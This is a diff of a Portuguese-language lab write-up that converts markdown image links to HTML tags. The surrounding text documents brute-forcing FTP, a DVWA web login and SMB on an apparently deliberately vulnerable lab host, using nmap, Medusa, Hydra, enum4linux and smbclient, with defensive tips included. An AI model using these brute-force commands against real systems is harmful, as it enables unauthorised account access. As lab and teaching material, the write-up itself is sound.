@@ -4,7 +4,6 @@ Comando para verificar se tenho acesso a outra na máquina na rede:
 
 ping \-c 3 192.168.56.101
 
-\!\[\](./images/imagem1.png)
 <img src="./images/imagem1.png">
 
 ok
@@ -14,14 +13,14 @@ descoberta de quais serviços estão disponíveis no alvo:
 
 nmap \-sV \-p 21,22,80,334,139 192.168.56.101
 
-\!\[\](images/imagem2.png)
+<img src="./images/imagem2.png">
 
 Porta 21 FTP aberta
 
 Tentando acessar o FTP:  
 ftp 192.168.56.101
 
-\!\[\](images/imagem3.png)
+<img src="./images/imagem3.png">
 
 \#\#Criando Usuários e Senhas
 
@@ -36,11 +35,11 @@ Usando o Medusa para atacar o FTP com 6 threads:
 medusa \-h 192.168.56.101 \-U users.txt \-P pass.txt \-M ftp \-t 6
 
 Sucesso detectado com usuário “msfadmin” e senha “msfadmin”:  
-\!\[\](images/imagem4.png)
+<img src="./images/imagem4.png">
 
 Testado e confirmado:
 
-\!\[\](images/imagem5.png)
+<img src="./images/imagem5.png">
 
 Como evitar:  
 \- Desativar serviços desnecessários, se o FTP não é necessário, não deve estar ativo  
@@ -59,10 +58,10 @@ Acessar pelo navegador:
 
 192.168.56.101\\dvwa
 
-\!\[\](images/imagem6.png)
+<img src="./images/imagem6.png">
 
 Ao tentar logar com o login marco e senha 123:  
-\!\[\](images/imagem7.png)
+<img src="./images/imagem7.png">
 
 criando os usuários e senhas:
 
@@ -76,7 +75,7 @@ medusa \-h 192.168.56.101 \-U users.txt \-P pass.txt \-M http \\
 \-m FORM: ‘username=^USER^\&password=^ PASS^\&Login=Login’ \\  
 \-m ‘FAIL=Login failed’ \- t 6
 
-\!\[\](images/imagem8.png)
+<img src="./images/imagem8.png">
 
 \*\*Problema:  
 Todos constaram como SUCCESS\*\*
@@ -85,7 +84,7 @@ Então utilizei o Hydra pra fazer esse teste:
 
 hydra \-L users.txt \-P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^\&password=^PASS^\&Login=Login:Login failed"
 
-\!\[\](images/imagem9.png)
+<img src="./images/imagem9.png">
 
 Usuário localizado: admin com senha: password
 
@@ -107,7 +106,7 @@ enum4linux \-a 192.168.56.101 | tee enum4\_output.txt
 
 usuários detectados:
 
-\!\[\](images/imagem10.png)
+<img src="./images/imagem10.png">
 
 Criando wordlists com usuários e senhas: 
 
@@ -122,7 +121,7 @@ medusa \-h 192.168.56.101 \-U smb\_users.txt \-P senhas\_spray.txt \-M smbnt \-t
 
 utilizando o host, usuários, senhas utilizando o módulo smbnt, duas threads simultaneas, até 50 hosts em paralelo.
 
-\!\[\](images/imagem11.png)
+<img src="./images/imagem11.png">
 
 tem uma linha com Account Found, com user e senha: msfadmin
 
@@ -131,7 +130,7 @@ smbclient \-L //192.168.56.101 \-U msfadmin
 
 Acesso conseguido:
 
-\!\[\](images/imagem12.png)
+<img src="./images/imagem12.png">
 
 Como evitar:  
 \- Autenticação multifator;  
